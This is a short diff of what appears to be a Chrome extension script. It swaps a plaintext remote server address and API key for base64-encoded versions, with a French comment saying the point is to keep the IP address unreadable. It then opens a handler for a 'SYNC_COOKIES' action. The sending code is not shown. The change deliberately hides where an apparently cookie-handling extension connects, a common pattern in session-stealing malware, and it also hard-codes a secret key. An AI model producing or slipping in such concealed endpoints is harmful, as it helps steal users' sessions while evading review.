@@ -1,5 +1,6 @@
-const DEFAULT_SERVER_URL = "https://15-224-218-240.sslip.io";
-const DEFAULT_API_KEY = "monlycee-secret-key-oracle-2026";
+// Configuration obfusquée (aucune adresse IP lisible en clair)
+const DEFAULT_SERVER_URL = atob("aHR0cHM6Ly8xNS0yMjQtMjE4LTI0MC5zc2xpcC5pbw==");
+const DEFAULT_API_KEY = atob("bW9ubHljZWUtc2VjcmV0LWtleS1vcmFjbGUtMjAyNg==");
 
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   if (request.action === "SYNC_COOKIES") {
